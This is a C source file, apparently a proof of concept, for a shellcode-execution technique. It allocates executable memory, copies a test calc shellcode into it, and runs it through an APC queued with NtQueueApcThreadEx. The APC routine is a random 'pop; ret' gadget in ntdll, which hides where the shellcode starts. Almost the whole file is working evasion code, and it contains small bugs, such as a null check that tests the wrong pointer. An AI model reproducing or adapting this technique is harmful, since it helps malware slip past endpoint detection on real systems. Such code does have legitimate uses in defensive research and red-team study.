#pragma once

#include "main.h"
#include "api.h"
#include "gadget.h"

static _NtQueueApcThreadEx NtQueueApcThreadEx = NULL;
static _NtTestAlert NtTestAlert = NULL;

VOID
queue_alert_thread_with_gadget(
    HANDLE hThread,
    LPVOID lpGadget,
    PVOID lpShellcode
)
{
    /**
    * hThread -> target thread to queue APC thread in
    * PPS_APC_ROUTINE -> random (pop r32; ret) gadget we found in target DLL space
    * ApcArgument1 -> pointer of shellcode to return into from gadget
    **/
    if (NT_SUCCESS(NtQueueApcThreadEx(hThread, NULL, (PPS_APC_ROUTINE)lpGadget, lpShellcode, NULL, NULL) == ERROR_SUCCESS))
    {
        NtTestAlert();
    }
}

BOOL 
init_apis(
    VOID
)
{
    HMODULE hNt = GetModuleHandle(L"ntdll.dll");
    if (hNt == NULL)
    {
        return FALSE;
    }

    // NtQueueApcThreadEx is Windows 7+
    NtQueueApcThreadEx = (_NtQueueApcThreadEx)GetProcAddress(hNt, "NtQueueApcThreadEx");
    if (NtQueueApcThreadEx == NULL)
    {
        return FALSE;
    }

    NtTestAlert = (_NtTestAlert)GetProcAddress(hNt, "NtTestAlert");
    if (NtQueueApcThreadEx == NULL)
    {
        return FALSE;
    }

    return TRUE;
}

int main(
    int argc, 
    char** argv
)
{
    if (!init_apis())
    {
        printf("[>] Failed to resolve APIs successfully, NtQueueApcThreadEx may not be present in NTDLL (Win7+)\n");
        return 0;
    }

    BYTE bTestCalcPayload[] = TEST_X86_CALC_EXEC_SC;
    LPVOID lpShellcode = VirtualAlloc(NULL, sizeof(bTestCalcPayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpShellcode == NULL)
    {
        printf("[>] Failed to allocate PAGE_EXECUTE_READWRITE memory for (n = %d)\n", sizeof(bTestCalcPayload));
        return 0;
    }

    printf("[>] Allocated space for sample shellcode at %p, copying..\n", lpShellcode);
    RtlCopyMemory(lpShellcode, bTestCalcPayload, sizeof(TEST_X86_CALC_EXEC_SC));

    // In this example, we'll find a pop r32; ret gadget within kernel32
    LPCWSTR lpcszTarget = L"ntdll.dll";
   
    LPVOID lpRandomGadget = gadget_find_rand_pop_ret(GetCurrentProcess(), lpcszTarget);
    if (lpRandomGadget == NULL)
    {
        printf("[>] Failed to find valid pop r32; ret gadget. Is this process 32-bit?\n");
        return 0;
    }

    wprintf(
        L"[>] Found usable gadget at location %ls!%p\n"
        L"[>] Calling NtQueueApcThreadEx(ApcRoutine = %p, SystemArgument1 = %p)\n",
        lpcszTarget, 
        lpRandomGadget, 
        lpRandomGadget,
        lpShellcode
    );

    queue_alert_thread_with_gadget(GetCurrentThread(), lpRandomGadget, lpShellcode);

    printf("[>] Freeing up the memory at %p\n", lpShellcode);
    VirtualFree(lpShellcode, 0, MEM_RELEASE);
    return 1;
}